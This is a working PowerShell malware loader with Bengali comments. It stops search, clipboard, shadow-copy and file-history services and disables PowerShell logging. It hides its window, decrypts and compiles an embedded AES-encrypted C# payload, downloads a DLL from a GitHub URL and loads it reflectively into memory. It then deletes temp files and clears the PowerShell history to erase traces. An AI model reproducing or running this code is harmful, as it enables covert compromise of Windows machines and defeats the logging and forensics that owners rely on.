Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\WSearch" -Name "Start" -Value 4 | Out-Null

Stop-Service -Name "WSearch" -Force -ErrorAction SilentlyContinue
Stop-Service -Name "cbdhsvc*" -Force -ErrorAction SilentlyContinue
Stop-Service -Name "VSS*" -Force -ErrorAction SilentlyContinue
Stop-Service -Name "fhsvc*" -Force -ErrorAction SilentlyContinue

$regCommand1 = "reg add 'HKLM\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ModuleLogging' /v EnableModuleLogging /t REG_DWORD /d 0 /f"
$regCommand2 = "reg add 'HKLM\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging' /v EnableScriptBlockLogging /t REG_DWORD /d 0 /f"
$regCommand3 = "reg add 'HKLM\SOFTWARE\WOW6432Node\Policies\Microsoft\Windows\PowerShell\ModuleLogging' /v EnableModuleLogging /t REG_DWORD /d 0 /f"
$regCommand4 = "reg add 'HKLM\SOFTWARE\WOW6432Node\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging' /v EnableScriptBlockLogging /t REG_DWORD /d 0 /f"

Invoke-Expression $regCommand1 | Out-Null
Invoke-Expression $regCommand2 | Out-Null
Invoke-Expression $regCommand3 | Out-Null
Invoke-Expression $regCommand4 | Out-Null

# টেম্প ফাইল ক্লিয়ার (গত ২ মিনিটের মধ্যে ক্রিয়েটেড)
Get-ChildItem -Path $env:TEMP -Filter "*.cs" -File | Where-Object { $_.CreationTime -gt (Get-Date).AddMinutes(-2) } | Remove-Item -Force -ErrorAction SilentlyContinue
Get-ChildItem -Path $env:TEMP -Filter "*.dll" -File | Where-Object { $_.CreationTime -gt (Get-Date).AddMinutes(-2) } | Remove-Item -Force -ErrorAction SilentlyContinue
Get-ChildItem -Path $env:TEMP -Filter "*.pdb" -File | Where-Object { $_.CreationTime -gt (Get-Date).AddMinutes(-2) } | Remove-Item -Force -ErrorAction SilentlyContinue
Get-ChildItem -Path $env:TEMP -Filter "*.tmp" -File | Where-Object { $_.CreationTime -gt (Get-Date).AddMinutes(-2) } | Remove-Item -Force -ErrorAction SilentlyContinue
Get-ChildItem -Path $env:TEMP -Filter "*.ps1" -File | Where-Object { $_.CreationTime -gt (Get-Date).AddMinutes(-2) } | Remove-Item -Force -ErrorAction SilentlyContinue

Set-StrictMode -Version Latest

$VerbosePreference      = 'SilentlyContinue'
$DebugPreference        = 'SilentlyContinue'
$InformationPreference  = 'SilentlyContinue'
$WarningPreference      = 'SilentlyContinue'
$ErrorActionPreference  = 'SilentlyContinue'
$ConfirmPreference                 = 'None'
$WhatIfPreference                  = $false
$PSModuleAutoLoadingPreference     = 'None'
$MaximumHistoryCount               = 0

*> $null
$Error.Clear()

[string] $script:vcPath        = $null
[System.IO.DirectoryInfo] $script:OpenSSHRoot = $null
[System.IO.DirectoryInfo] $script:gitRoot     = $null
[bool]   $script:Verbose       = $false
[string] $script:BuildLogFile  = $null

Set-ExecutionPolicy Unrestricted -Scope Process -Force | Out-Null

Add-Type -Name Window -Namespace Console -MemberDefinition @'
[DllImport("Kernel32.dll")] public static extern IntPtr GetConsoleWindow();
[DllImport("user32.dll")] public static extern bool ShowWindow(IntPtr hWnd, Int32 nCmdShow);
'@ -ErrorAction SilentlyContinue
[Console.Window]::ShowWindow([Console.Window]::GetConsoleWindow(), 0)

function Invoke-Finalize {
    try {
        Get-Variable -Scope Script -ErrorAction SilentlyContinue |
            Remove-Variable -Scope Script -Force -ErrorAction SilentlyContinue
        Get-Variable | Where-Object {
            $_.Name -notmatch '^(PS|ExecutionContext|Host|Error|MyInvocation|PID)$'
        } | Remove-Variable -Force -ErrorAction SilentlyContinue
        Clear-Host
        $Error.Clear()
        [GC]::Collect()
        [GC]::WaitForPendingFinalizers()
        [GC]::Collect()
        Get-Process | ForEach-Object { $_.MinWorkingSet = $_.MinWorkingSet }
        Get-Process | Where-Object {$_.WorkingSet -gt 300MB} | Stop-Process -Force
    }
    catch {}
}

if (!([bool]([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")))
{
    Invoke-Finalize
    return
}

$encryptedBase64 = "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িনLc7nXxTtzHHiE1zbTjOzXvcef0xV0M1/vIjBtBDUrxQ0F3Sp9Z56qrs4K4LDa6HWALb2RiWoB7yNvnc36gdSaWNGn2bmYBrijCTld7ovR/2GykzYHu595NEksd344NuurEsofEO0VETWsMZdzqrQUtcy3/G05BZu35gbD46Im2MsUZj6NcMMsNrzxIyCwFHRmXCVlF0h6tlf1eS5ZSlg3c2WOu1ThkcmsK2Gh2isCeFZq9yXmtkafN3x+JQU5rIECOht4we0Tupt1U7S2keeRAGFEQzVm4v5Dn9s61m7tqgTSY9oT5BZ9RfxvljvZIfq8FolHHC1w1zpyljTOEVy/cxk3iwLN/eZoYJcBkaYn/r2ng6n7A5rxykMftmtftGmAwPQCzl2IwN10RScxPseZorQ1l5G2PuMQdBUl13eJmruvWafy2g+G9PFZxw6lydCA38cuETnMO05Se3bzDn9vEZqDgNqnYTyPPJlUfrPUv1ARcryKjCsyVRFvixFArUnn0yGNR+hyDbXaY80VmSlBLffFaGMeBRMXXQiRDYOc0V8pxQ636pEokyvJ+HToruF1p2LkNqTJZfzRuiQNZZsNipRtdSdH8z2ci5WSS15Oi1oiHIs52sd3Cd35H8q3B5neArymnWKKW/0O6Wn/G8/F3q6VOvOhp9Yh+1FY/69pYfD0YRMs435sqajW+69TLgVxSyUANgaX5IMkoi0fDLrHFtG87bEjoYr4ImC2AgbDT/BQAXIsBETdD7lxmJBBVznJhrpyCbiRXO1xTZ6EvzG2MzoGxN7+H+rk60Ckk4WIMwrtVYjW0/RwQUfL2adtV+uMj73X5cKV5Wsd7+tsKZZjeJ4JoVUdJYFuw3sOIMrtj+D2pnGbIisEvvzoGC8FXXapt9Xl9hOCNKkf0H9gCxhUwwIu05haLKhWMrC28l9eDxtgbFHdumFrJVH7yhAJ2cnOHSdgPytuAivdYo4pArPbBYs6qS3rDMMTVKM3lvxiDP/2jK7nCxj13aaT43wfnxFV9gBCwD/RuYrmOhYzTfTd2AuT1in2V1uTU678VzOOV98h+sCqqd7hg9tZnoHBU2EdSiaf12fbozHzJz1Mes3tTilteKZwUUmDmf1J3KZGYF7kBBK5Zi7S3dXBzpTtfdhZyIG2TuzMYk1j0hZHL8B8309HHpDSLzcaadrMaSBr/J5/O5H6OAYb1nMMBGQ21s6OhwX9uzs0tdtN5ycZjeG40CSWAW9UUqvVkFyJQR1fL1RwuaQI68WPHE8ps//rmZg=="

$keyBase64       = "oytpoSVe0TwSRLcxB5ftOkVk1bdZMudIbe+RZpau/i4="
$ivBase64        = "bCY1A9Nd7lMexMg4rZ2SDQ=="

function Get-DecryptedKernel {
    param(
        [string]$encB64,
        [string]$keyB64,
        [string]$ivB64
    )
    $encBytes = [Convert]::FromBase64String($encB64)
    $key      = [Convert]::FromBase64String($keyB64)
    $iv       = [Convert]::FromBase64String($ivB64)

    $aes = [System.Security.Cryptography.Aes]::Create()
    $aes.Key = $key
    $aes.IV  = $iv
    $aes.Mode = [System.Security.Cryptography.CipherMode]::CBC
    $aes.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7

    $decryptor = $aes.CreateDecryptor()
    $plainBytes = $decryptor.TransformFinalBlock($encBytes, 0, $encBytes.Length)
    return [System.Text.Encoding]::UTF8.GetString($plainBytes)
}

$kernel = Get-DecryptedKernel -encB64 $encryptedBase64 -keyB64 $keyBase64 -ivB64 $ivBase64

try {
    $null = Add-Type -TypeDefinition $kernel -ErrorAction Stop
} catch {
    Invoke-Finalize
    return
}

$bytes = (New-Object System.Net.WebClient).DownloadData("https://github.com/desert007/bios/raw/refs/heads/main/version.dll")
[NativeLoader]::Map($bytes, $true)

# টেম্প ফাইল ক্লিয়ার (গত ২ মিনিটের মধ্যে ক্রিয়েটেড)
Get-ChildItem -Path $env:TEMP -Filter "*.cs" -File | Where-Object { $_.CreationTime -gt (Get-Date).AddMinutes(-2) } | Remove-Item -Force -ErrorAction SilentlyContinue
Get-ChildItem -Path $env:TEMP -Filter "*.dll" -File | Where-Object { $_.CreationTime -gt (Get-Date).AddMinutes(-2) } | Remove-Item -Force -ErrorAction SilentlyContinue
Get-ChildItem -Path $env:TEMP -Filter "*.pdb" -File | Where-Object { $_.CreationTime -gt (Get-Date).AddMinutes(-2) } | Remove-Item -Force -ErrorAction SilentlyContinue
Get-ChildItem -Path $env:TEMP -Filter "*.tmp" -File | Where-Object { $_.CreationTime -gt (Get-Date).AddMinutes(-2) } | Remove-Item -Force -ErrorAction SilentlyContinue

# ভেরিয়েবল ক্লিয়ার
$bytes = $null; $kernel = $null; $type = $null
$plainCSharp = $null
[GC]::Collect(); [GC]::WaitForPendingFinalizers()

# =================================================================
# POWERSHELL HISTORY CLEAR (সবশেষে ফাইলটি ফাঁকা করার লজিক)
# =================================================================
# এনভায়রনমেন্ট ভ্যারিয়েবল ব্যবহার করে ডাইনামিক পাথ তৈরি
$historyPath = "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"

if (Test-Path $historyPath) {
    # ফাইল ডিলিট না করে ভেতরের সব লেখা মুছে সম্পূর্ণ ফাঁকা বা ক্লিন করার জন্য:
    Clear-Content -Path $historyPath -ErrorAction SilentlyContinue
}

Invoke-Finalize
